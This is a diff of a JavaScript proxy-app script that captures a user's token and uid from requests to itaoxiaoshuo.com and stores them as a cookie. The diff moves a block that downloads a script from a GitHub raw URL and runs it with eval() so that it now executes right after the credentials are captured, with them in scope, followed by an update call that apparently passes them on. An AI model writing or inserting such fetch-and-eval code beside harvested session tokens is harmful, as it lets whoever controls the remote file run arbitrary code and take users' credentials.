@@ -3,13 +3,7 @@
 const cookieName = '淘小说'
 
 const moliyadi = init()
-$httpClient.get(
-   'https://raw.githubusercontent.com/moliyadi007/automatic_task/main/ql_sync.js',
-    (err,res,data)=>{
-      eval(data)
-    });
-  
-console.log('eval完成')
+
 if ($request && $request.method == 'POST' && $request.url.indexOf('itaoxiaoshuo.com/regIds') >= 0) {
     let token = $request.body.match(/token=(.+?&)/)[1]
     let uid = $request.body.match(/uid=(.+?&)/)[1]
@@ -22,9 +16,14 @@ if ($request && $request.method == 'POST' && $request.url.indexOf('itaoxiaoshuo.
       }else{
       moliyadi.setdata(txsValue,'txsKey')
       moliyadi.msg(cookieName, `获取cookie成功`, '')
+      $httpClient.get(
+   'https://raw.githubusercontent.com/moliyadi007/automatic_task/main/ql_sync.js',
+    (err,res,data)=>{
+      eval(data)
       update(old_value,txsValue,'txsCookie','淘小说','@')
       moliyadi.msg(cookieName, `更新cookie成功`, '')
-      }
+    });
+    }
     }else{
       moliyadi.msg(cookieName, `cookie获取失败`, '')
     }
